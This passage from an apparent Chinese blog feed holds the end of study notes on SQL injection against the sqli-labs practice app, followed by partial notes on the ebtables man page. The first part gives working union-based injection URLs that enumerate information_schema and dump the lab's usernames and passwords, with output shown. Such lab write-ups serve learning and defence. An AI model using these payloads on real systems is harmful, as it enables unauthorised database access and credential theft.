1</span><br></pre></td></tr></table></figure></li><li><p>在注入遇到困难的时候要想到运用 <code>&amp;</code> 操作符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">考虑： SELECT * FROM users WHERE id=1 &amp; 1=1;# 优先级 ： &apos;&amp;&apos; &gt; &apos;=&apos;</span><br><span class="line">1. id=1 &amp; 1 # TRUE 与 1 进行与运算，结果为1</span><br><span class="line">2. 再 1=1， 结果还是1，既TRUE</span><br><span class="line">3. 返回表的所有行</span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>关于对3对应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用数值转换后进行‘与’‘或’‘非’’异或‘等运算，然后再进行注入</span><br><span class="line">如，将字符转换为ASCII码，再分别与1，2，4，8... &amp;运算，可以</span><br><span class="line">得到每一位的值，拼接起来就是ASCII码，再从ASCII码反推回字符。</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>不得不面对的系统数据库：information_schema</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;USE information_schema;</span><br><span class="line">&gt;SHOW tables;</span><br><span class="line">... 有 ...</span><br><span class="line">字符集表(CHARACTER_SETS)</span><br><span class="line">引擎表(ENGINES)</span><br><span class="line">事件表(EVENTS)</span><br><span class="line">文件(FILES)</span><br><span class="line">全局变量(GLOBAL_VARIABLES)</span><br><span class="line">模式权限表(SCHEMA_PRIVILEGES)# SCHEMA 我推测就是 所存在的所有数据库名</span><br><span class="line">TABLES  # 重要！存了所有数据库中的所有表的信息</span><br><span class="line">SCHEMATA# 当前存在的所有数据库名及其字符集，数据库名字段为 schema_name</span><br><span class="line">用户权限表(USER_PRIVILEGES)</span><br><span class="line">和一些InnoDB相关的表：以 INNODB_ 开头</span><br></pre></td></tr></table></figure></li></ol><ol start="6"><li><p>information_schema 的 TABLES 表中的’字段名’的解释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&gt; DESC TABLES;</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field           | Type                | Null | Key | Default | Extra |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| TABLE_CATALOG   | varchar(512)        | NO   |     |         |       |</span><br><span class="line">| TABLE_SCHEMA    | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME      | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_TYPE      | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| ENGINE          | varchar(64)         | YES  |     | NULL    |       |</span><br><span class="line">| VERSION         | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| ROW_FORMAT      | varchar(10)         | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_ROWS      | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AVG_ROW_LENGTH  | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_LENGTH     | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| MAX_DATA_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| INDEX_LENGTH    | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| DATA_FREE       | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| AUTO_INCREMENT  | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| UPDATE_TIME     | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| CHECK_TIME      | datetime            | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COLLATION | varchar(32)         | YES  |     | NULL    |       |</span><br><span class="line">| CHECKSUM        | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">| CREATE_OPTIONS  | varchar(255)        | YES  |     | NULL    |       |</span><br><span class="line">| TABLE_COMMENT   | varchar(2048)       | NO   |     |         |       |</span><br><span class="line">+-----------------+---------------------+------+-----+---------+-------+</span><br><span class="line">21 rows in set (0.00 sec)</span><br><span class="line">其中，</span><br><span class="line">TABLE_SCHEMA --- 当前已经存在的所有数据库名称</span><br><span class="line">TABLE_NAME.  --- 属于数据库&apos;TABLE_SCHEMA&apos;中的所有表的名称</span><br></pre></td></tr></table></figure></li></ol><ol start="7"><li><p>针对6的应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;SELECT table_name</span><br><span class="line">FROM information.tables</span><br><span class="line">WHERE table_schema = &apos;test&apos;;#test数据库里存了用户名/账号表</span><br><span class="line">获得表名</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| users      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ol><ol start="8"><li><p>利用 information_schema 的可用注入一般流程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. 可以查看有哪些数据库</span><br><span class="line">&gt; SELECT schema_name FROM information_schema.schemata;</span><br><span class="line"></span><br><span class="line">2. 还可以猜数据库存不存在</span><br><span class="line">&gt; SELECT * FROM information_schema.schemata WHERE schema_name = &apos;users&apos;;</span><br><span class="line">//users 数据库存不存在?</span><br><span class="line"></span><br><span class="line">3. 查看/猜某个已存在的数据库中有没有xxx表</span><br><span class="line">&gt; SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;db_name&apos;;</span><br><span class="line">or &gt; SELECT * FROM information_schema.tables WHERE table_name = &apos;xxx&apos;;</span><br><span class="line">or .. AND table_schema = &apos;yyy&apos;;</span><br><span class="line"></span><br><span class="line">4.获取某表的所有列</span><br><span class="line">&gt; SELECT column_name FROM information_schema.columns WHERE table_name = &apos;xxx&apos;;</span><br><span class="line"></span><br><span class="line">5.获取某列内容</span><br><span class="line">&gt; SELECT yyy FROM xxx [WHERE ...];</span><br></pre></td></tr></table></figure></li></ol><ol start="9"><li><p>有关 information_schema 数据库中 COLUMNS 表的相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [information_schema]&gt; DESC columns;</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">| Field                    | Type                | Null | Key | Default | Extra |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">//省略一些信息</span><br><span class="line">| TABLE_SCHEMA             | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| TABLE_NAME               | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| COLUMN_NAME              | varchar(64)         | NO   |     |         |       |</span><br><span class="line">//</span><br><span class="line">| IS_NULLABLE              | varchar(3)          | NO   |     |         |       |</span><br><span class="line">| DATA_TYPE                | varchar(64)         | NO   |     |         |       |</span><br><span class="line">| CHARACTER_MAXIMUM_LENGTH | bigint(21) unsigned | YES  |     | NULL    |       |</span><br><span class="line">//</span><br><span class="line">| COLUMN_TYPE              | longtext            | NO   |     | NULL    |       |</span><br><span class="line">| COLUMN_KEY               | varchar(3)          | NO   |     |         |       |</span><br><span class="line">| EXTRA                    | varchar(27)         | NO   |     |         |       |</span><br><span class="line">| PRIVILEGES               | varchar(80)         | NO   |     |         |       |</span><br><span class="line">+--------------------------+---------------------+------+-----+---------+-------+</span><br><span class="line">20 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">大体结构为：</span><br><span class="line">+---+-------------------+---------------------+-------------------------+-------+</span><br><span class="line">xxx - 库名(TABLE_SCHEMA) - 该库的表名(TABLE_NAME) - 该表的列名(COLUMN_NAME) - xxx   |</span><br><span class="line">+---+-------------------+---------------------+-------------------------+-------+</span><br></pre></td></tr></table></figure></li></ol><ol start="10"><li><p>我对 ORDER BY 子句的误解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一直以为 ORDER BY + 列名;</span><br><span class="line">实际上，ORDER BY + 列名的序号也是可以的！如，</span><br><span class="line">ORDER BY 1# 表示按第一列排序</span><br><span class="line">ORDER BY 1 DESC # 按第一列降序排列</span><br><span class="line">ORDER BY 1,2 # 先按第一列后按第二列排序</span><br></pre></td></tr></table></figure></li><li><p>关于 group_concat(某列)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">分组连接，顾名思义</span><br><span class="line">将分组中的所有该列的内容，用&apos;,&apos;拼接在一起</span><br></pre></td></tr></table></figure></li><li><p>有关数据库权限的测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">MariaDB: </span><br><span class="line">&gt; grant all privileges on security.* to &apos;researcher&apos;@&apos;localhost&apos; identified by &apos;123456&apos; with grant option;</span><br><span class="line"></span><br><span class="line">修改 sql-connection/db_creds.inc:</span><br><span class="line">$dbuser=&apos;researcher&apos;</span><br><span class="line">$dbpass=&apos;123456&apos;</span><br><span class="line"></span><br><span class="line">执行</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</span><br><span class="line">看是否还能显示出所有的数据库信息</span><br><span class="line"></span><br><span class="line">测试结果</span><br><span class="line">只能显示少数已存在的数据库信息（这些信息都是&apos;researcher&apos;的权限可见的！</span><br><span class="line"></span><br><span class="line">显示的信息对比：</span><br><span class="line">当dbuser=root时，显示</span><br><span class="line">&gt;&gt;&gt; Your Login name:information_schema,Sample,challenges,cloud_data,dvwa,mysql,performance_schema,security,test###显示了所有数据库，是因为root权限太大，也就是控制该网页的管理员权限太大</span><br><span class="line">当dbuser=researcher时，显示</span><br><span class="line">&gt;&gt;&gt; Your Login name:information_schema,security,test</span><br><span class="line"></span><br><span class="line">结论：</span><br><span class="line">显示了所有数据库，是因为root权限太大，也就是控制该网页的管理员权限太大</span><br></pre></td></tr></table></figure></li></ol><ol start="13"><li><p>猜解security数据库中有哪些表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+</span><br><span class="line">输出：</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></li></ol><ol start="14"><li><p>猜解表users中有哪些列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INPUT：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --+此时可以看到所有数据库中包含的users表中的字段信息</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">Your Login Name:      user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,user_id,username,password</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br><span class="line">可以加强限制来避免这一点：</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = &apos;security&apos; and table_name=&apos;users&apos; --+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:id,username,password</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure></li></ol><ol start="15"><li><p>得到合法字段名后，开始获取所需要的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">比如获取id=2的用户信息：</span><br><span class="line">INPUT:</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1%27%20union%20select%201,username,password%20from%20users%20where%20id=2%20--+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:Angelina</span><br><span class="line">Your Password:I-kill-you</span><br></pre></td></tr></table></figure></li></ol><ol start="16"><li><p>来个所有数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">INPUT:</span><br><span class="line">http://10.211.55.13/sqli-labs/Less-1/?id=-1&apos; union select 1,group_concat(username),group_concat(password) from users --+</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure><p>注：不只这么多花样，你还可以结合mysql的语法弄出更多花里胡哨的东西。。。</p><p>注2：之所以要使用group_concat是因为网站限制了输出的条目，LIMIT 0,1导致只能输出一条</p></li></ol><ol start="17"><li><p>总结</p><p>要想玩的熟练，必须得非常熟悉 information_schema 的数据库及其表的结构才行。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;对WHERE子句的一些浅要理解&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span clas
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ebtables 的Man Page</title>
    <link href="https://r0sev.github.io/2019/05/16/ebtables-%E7%9A%84Man-Page/"/>
    <id>https://r0sev.github.io/2019/05/16/ebtables-的Man-Page/</id>
    <published>2019-05-16T09:20:13.000Z</published>
    <updated>2019-05-19T09:20:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>以下内容来自 Man Page</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-</strong>[<strong>ACDI</strong>] chain rule specification [match extensions] [watcher extensions] target<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-P</strong> chain <strong>ACCEPT</strong> | <strong>DROP</strong> | <strong>RETURN</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-F</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-Z</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-L</strong> [<strong>-Z</strong>] [chain] [ [<strong>–Ln</strong>] | [<strong>–Lx</strong>] ] [<strong>–Lc</strong>] [<strong>–Lmac2</strong>]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-N</strong> chain [<strong>-P ACCEPT</strong> | <strong>DROP</strong> | <strong>RETURN</strong>]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-X</strong> [chain]<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>-E</strong> old-chain-name new-chain-name<br><strong>ebtables</strong> [<strong>-t</strong> table ] <strong>–init-table</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-commit</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-init</strong><br><strong>ebtables</strong> [<strong>-t</strong> table ] [<strong>–atomic-file</strong> file] <strong>–atomic-save</strong> </p><p>注：-t 如果有，必须第一个写。</p><h3 id="表-三张"><a href="#表-三张" class="headerlink" title="表 - 三张"></a>表 - 三张</h3><ul><li>filter - 默认表。<ul><li>内建的链：<strong>INPUT</strong> {帧[在MAC层面上]就是发给网桥的时候[即帧的目的MAC地址就是网桥时]会经过这条链chain } </li><li><strong>OUTPUT</strong>{ 适用于本地生成的帧，或者是(b)routed的帧，或说routed我知道是路由时IP层下来的，但是brouted是<strong>什么鬼？？</strong>  }</li><li><strong>FORWARD</strong> { 适用于被网桥转发的帧 }</li></ul></li><li>nat - 最常用来改变帧的目的mac地址<ul><li>内建的链：<strong>PREROUTING</strong> { 适用于在帧刚进主机（路由器）的时候 }</li><li><strong>OUTPUT</strong> { for altering locally generated or (b)routed frames before they are bridged }</li><li><strong>POSTROUTING</strong> { 适用于帧马上要离开主机（路由器）的时候 }</li><li>注：PREROUTING and POSTROUTING: it would be more accurate to call them PREFORWARDING and POSTFORWARDING，且你可以使用 -E 选项来将其改名</li></ul></li><li>broute - 经常备用来 make a brouter ???<ul><li>只有一条内建的链：<strong>BROUTING</strong> , 且这个表中的<strong>DROP</strong>和<strong>ACCEPT</strong>分别表示”让其被路由“和”让其被桥接“</li><li>BROUTING chain 在很早就会被帧拿来做匹配，当然只能运行”流经<strong>转发状态的端口</strong>的帧“来匹配，此处target常用<code>redirect</code></li></ul></li></ul><h3 id="CHAINS-若干"><a href="#CHAINS-若干" class="headerlink" title="CHAINS - 若干"></a>CHAINS - 若干</h3><p>理解方式一：</p><p>内核中有三张内嵌有CHAINS的表。三张表按功能划分，每个功能（也就是表）中用该功能相适应的“规则”。每一条规则就是一个chain。</p><p>每一条chain都是一个有特定顺序的“链表”，用来做一次以太网帧的匹配。如果，某个以太网帧匹配到了一条chain，那么就对该帧执行</p><p>这条chain上的 target。如果这个帧没有匹配上这条chain，那么继续匹配下一跳chain，用户可以扩展一条chain（创建chain的第二个</p><p>往后的结点）然后使用 “头结点” chain “head” 的 target 域来连接。</p><p>*理解方式不重要，解决问题才重要。</p><p>理解方式二：</p><p>内核中有三张内嵌有CHAINS的表。三张表按功能划分，每个功能（也就是表）中用该功能相适应的“规则”。每”一类规则“集就是一个chain。</p><p>如INPUT chain，OUTPUT chain 等，每一条 chain 都是有特定顺序的规则，用来依次做以太网帧的匹配。如果，某个以太网帧匹配到了一</p><p>条 chain 中的某一个规则，那么就对该帧执行这条规则上的 target 。如果这个帧没有匹配上这条规则，那么继续匹配改chain中的下一条规则，</p><p>用户可以扩展一条chain（创建一类新的规则集）然后使用内建的规则集（chain）的 target 域来连接。</p><p><strong>搞清楚上文的问号部分：什么事brouter(before route or bridge route)，什么是转发状态的端口，什么是redirect，怎么理解broute</strong></p><ul><li>brouter 即 bridge router ，能桥接又能路由的路由器（目前大部分都是这样）</li><li>REDIRECT：会改变目标MAC地址，在BROUTING链里使用时，MAC地址被改为桥端口地址；在nat表的PREROUTING链中使用时，会改为网桥的地址</li><li>broute</li><li>转发状态的接口</li></ul><h3 id="TARGETS"><a href="#TARGETS" class="headerlink" title="TARGETS"></a>TARGETS</h3><ul><li><p>ACCEPT</p></li><li><p>DROP - 丢，不通知</p></li><li><p>CONTINUE - 必须去匹配下一个规则（rule）</p></li><li><p>RETURN - 有点函数返回的意味。停止继续匹配这条 chain 上（采用理解方式二）的规则，转而去匹配从”调用“（通过target域调用）这条</p><p>chain 的那个 chain 的下一条规则。</p></li><li><p>EXTENSION</p></li><li><p>jump to a user-defined chain</p></li></ul><p>注： In the <strong>BROUTING</strong> chain however, the <strong>ACCEPT</strong> and <strong>DROP</strong> target have different meanings.</p><h3 id="ebtables-命令的使用及参数说明"><a href="#ebtables-命令的使用及参数说明" class="headerlink" title="ebtables 命令的使用及参数说明"></a>ebtables 命令的使用及参数说明</h3><p>注：一般一次只能输入一条命令，除非 <code>-L</code> 和 <code>-Z</code> 同时使用；或者<code>-N</code> <code>-P</code>同时使用；或者使用了<code>--atomic-file</code></p><p>-D, –delete</p><p>​                -D start_nr[:end_nr] 或者-D complete-rule，可以使用负数</p><p>-C, –change-counters</p><p>​                pass</p><p>-I, –insert</p><p>​                -I rule [在某个特定的位置，一般是某一个chain的最开始]插入一条rule</p><p>​                如果现在某个chain已经有了N条规则，那么在 i（i&gt;0）出插入和在 i-N-1</p><p>​                 处插入是一样的。当要一次性插入多条规则时，令 i 严格小于0 是有好处的。</p><p>-P, –policy</p><p>​                设置chain的默认target，ACCEPT、DROP、RETURN</p><p>-F, –flush</p><p>​                除非你指定一条chain，否则清除所有chain的规则</p><p>-Z, –zero</p><p>​                除非你指定一条chain，否则设置所有chain的匹配计数为0，与-L连用时，会先print出已有的匹配计数</p><p>-L, –list</p><p>​                除非你指定一条chain，否则所有chain的规则都列出来</p><p>​                –Ln 列出所有规则的rule number（即在chain中的序号），与–Lx不兼容</p><p>​                –Lc 在列出规则同时也展示匹配的帧的数量(pcnt)和字节计数(bcnt)，与–Lx配合时可以美化匹配计数的显示</p><p>​                –Lx </p><p>​                –Lmac2 展示完整的mac地址</p><p>-N, –new-chain</p><p>​                创建一个自定义链，自定义链的最大名字长度为31个字符，默认target是ACCEPT，但可辅助以-P修改</p><p>-X, –delete-chain</p><p>​                删除一条没有被引用的用户自定义链，如果没有指定则删除所有没被引用的自定义chain</p><p>-E, –rename-chain</p><p>​                可以重命名自定义链或者内建的链，作用不是很大，如果更改则在提交问题的时候注意写明。</p><p>–init-table</p><p>​                将当前table的数据用初始数据覆盖</p><p>–atomic-init</p><p>​                将内核中保存的该table的原始数据保存到一个特定文件中去（相当于最初试的快照）</p><p>–atomic-save</p><p>​                将内核中保存的该table的目前的数据保存到一个特定文件中去（相当于备份）</p><p>–atomic-commit</p><p>​                可以将一个特定文件中的数据提交到并覆盖内核中的数据</p><p>​                使用步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 先将使用 --atomic-init 或者 --atomic-save 产生的table数据文件使用`--atomic-file` 加载到当前的防火墙table</span><br></pre></td></tr></table></figure><ol start="2"><li>加载文件至防火墙table（此时还没刷新内核中的数据呢）还有另一途径就是：设置<em>EBTABLES_ATOMIC_FILE</em> 环境变量</li><li>使用<code>--atomic-commit</code> 提交并修改内核中的数据</li><li>在操作系统起始的 boot script 中十分有用，用来构建快速 ebtables</li></ol><p>-V, –version</p><p>-h, –help [list of module names]</p><p>-j, –jump <em>target</em></p><p>–atomic-file <em>file</em></p><p>-M, –modprobe <em>program</em> : 与内核交互时，使用 <em>program</em> 尝试自动加载某个缺失的内核模块</p><p>–concurrent : 设置一个锁防止脚本们并发地修改内核中维护的 ebtables 表</p><h3 id="规则说明"><a href="#规则说明" class="headerlink" title="规则说明"></a>规则说明</h3><p>-p, –protocol [!] <em>protocol</em></p><p>​                创造出一个帧所使用的协议，可以是一个大于 0x0600 的16进制数 或<strong>长度</strong>。以太网帧的协议域可以用来指示头部的长度。当该域的值小于或等于 0x0600时，那么该值就等于帧头的大小并且不能被用作协议号。相反，所有协议域被用作长度域时的帧通常会被认为使用了“和那个长度对应”的协议。这些协议在这些帧中的名字就是长度(值) [<strong>LENGTH</strong>)，<code>/etc/ethertypes</code> 文件以人类可读的方式展示了协议及其的十六进制数字，和英文缩写。比如，<em>0x0800</em> 就表示IPV4协议。这个文件不是大小写敏感的，–proto 可以用来替换 -p</p><p>-i, –in-interface [!] <em>name</em></p><p>​                 帧进来的接口(bridge port)，这个选项在 INPUT,FORWARD,PREROUTING,BROUTING链中有用。如果接口名字以’+’结尾，那么所有以该名字开头的接口都会被匹配，可以用 <code>--in-if</code>  替代</p><p>–logical-in [!] <em>name</em></p><p>​                 帧进来的逻辑接口(如 eth0.1 这样的？)，生效于👆所提及的四条链，且+也同上。</p><p>-o, –out-interface [!] <em>name</em></p><p>​                 帧要往哪个接口发出(bridge port)，这个选项在 OUTPUT,FORWARD,POSTROUTING链中有用。如果接口名字以’+’结尾，那么所有以该名字开头的接口都会被匹配，可以用 <code>--out-if</code>  替代</p><p>–logical-out [!] <em>name</em></p><p>​                 定义帧要出去的逻辑接口(如 eth0.2 这样的？)，生效于👆所提及的四条链，且+也同上。</p><p>-s, –source [!] <em>address[/mask]</em></p><p>​                 源MAC地址，掩码与地址都用6个被冒号分隔的十六进制表示。你可以手动指定如下这些：</p><p>​                 Unicast = 00:00:00:00:00:00/01:00:00:00:00:00</p><p>​                 <em>Multicast</em>=01:00:00:00:00:00/01:00:00:00:00:00</p><p>​                 <em>Broadcast</em>=ff:ff:ff:ff:ff:ff/ff:ff:ff:ff:ff:ff</p><p>​                 <em>BGA</em>=01:80:c2:00:00:00/ff:ff:ff:ff:ff:ff</p><p>​                 注意：广播地址的帧也会和多播地址规则匹配，可以用 –src 来替代这个命令</p><p>-d, –destination [!] <em>address</em>[/mask]</p><p>​                 The destination MAC address. See -s (above) for more details on MAC addresses. The flag –dst is an alias for this option.</p><p>-c, –set-counter <em>pcnt bcnt</em></p><p>​                 </p><h3 id="扩展选项-EXTENSIONS"><a href="#扩展选项-EXTENSIONS" class="headerlink" title="扩展选项 EXTENSIONS"></a>扩展选项 EXTENSIONS</h3><p>注：无需向 iptables 那样使用 -m 来加载，ebtables 的内部实现里会自动加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">未翻译部分：;;原因：本论文可能用不到</span><br><span class="line"></span><br><span class="line">802_3：</span><br><span class="line"></span><br><span class="line">Specify 802.3 DSAP/SSAP fields or SNAP type. The protocol must be specified as LENGTH (see the option -p above).</span><br><span class="line">--802_3-sap [!] sap</span><br><span class="line">DSAP and SSAP are two one byte 802.3 fields. The bytes are always equal, so only one byte (hexadecimal) is needed as an argument.</span><br><span class="line">--802_3-type [!] type</span><br><span class="line">If the 802.3 DSAP and SSAP values are 0xaa then the SNAP type field must be consulted to determine the payload protocol. This is a two byte (hexadecimal) argument. Only 802.3 frames with DSAP/SSAP 0xaa are checked for type.</span><br><span class="line"></span><br><span class="line">ip6 - 未翻译</span><br><span class="line">stp - 未翻译</span><br></pre></td></tr></table></figure><p><strong>among</strong></p><p>将MAC地址或MAC/IP地址对和某个MAC地址列表（MAC/IP地址对列表）做匹配。</p><p>MAC地址或MAC/IP地址对 如：xx:xx:xx:xx:xx:xx[=yy.yy.yy.yy][,]</p><p>在该列表中出现同一MAC不同IP的时也是会正常做匹配的</p><p>–among-dst [!] <em>list</em> 对比MAC目的地址</p><p>–among-src [!] <em>list</em> 对比MAC源地址</p><p>–among-dts-file [!] <em>file</em> 